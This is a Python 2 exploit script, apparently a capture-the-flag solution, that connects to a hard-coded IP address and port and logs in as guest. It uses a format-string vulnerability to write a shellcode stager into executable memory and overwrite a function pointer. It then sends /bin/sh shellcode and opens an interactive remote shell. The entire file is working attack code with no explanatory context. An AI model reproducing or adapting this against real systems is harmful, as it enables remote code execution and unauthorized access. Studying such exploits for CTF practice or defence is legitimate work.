#!/usr/bin/python
import operator
import struct
import socket
import telnetlib

def readuntil(f, delim=': '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('202.112.26.107', 10910))
f = s.makefile('rw', bufsize=0)

readuntil(f)
f.write('guest\n')
readuntil(f)
f.write('guest123\n')

readuntil(f)
f.write('2\n')
readuntil(f, ':\n')
f.write('A' * 256 + '\n')
readuntil(f)

f.write('4\n')
readuntil(f)
f.write('\n')
readuntil(f)
f.write('\n')
readuntil(f)

writes = {}

def write8(where, what):
    global writes
    writes[where] = what & 0xffff
    writes[where + 2] = (what >> 16) & 0xffff
    writes[where + 4] = (what >> 32) & 0xffff
    writes[where + 6] = (what >> 48) & 0xffff

stager = '31fff7efb602eb055e0f05ffe6e8f6ffffff'.decode('hex')
rwx_addr = 0x304aa8880
for i in xrange(0, len(stager), 8):
    write8(rwx_addr + i, u(stager[i:i+8].ljust(8, '\x00')))

pin_funptr_addr = 0x304a80168
write8(pin_funptr_addr, rwx_addr)

username = ''
password = ''
printed = 0
index = 40

for where, what in sorted(writes.items(), key=operator.itemgetter(1)):
    delta = (what - printed) & 0xffff

    if delta > 0:
        if delta < 8:
            username += 'A' * delta
        else:
            username += '%' + str(delta) + 'x'

    username += '%' + str(index) + '$hn'
    index += 1

    password += p(where)
    printed += delta

assert '\n' not in username
assert '\n' not in password
assert len(username) < 256
assert len(password) < 256

f.write(username + '\n')
readuntil(f)

f.write(password + '\n')
readuntil(f, 'System shutdown.\n')

shellcode = '6a3b589952eb065f4831f60f05e8f5ffffff2f62696e2f7368'.decode('hex')
f.write(shellcode)
print 'done'

t = telnetlib.Telnet()
t.sock = s
t.interact()

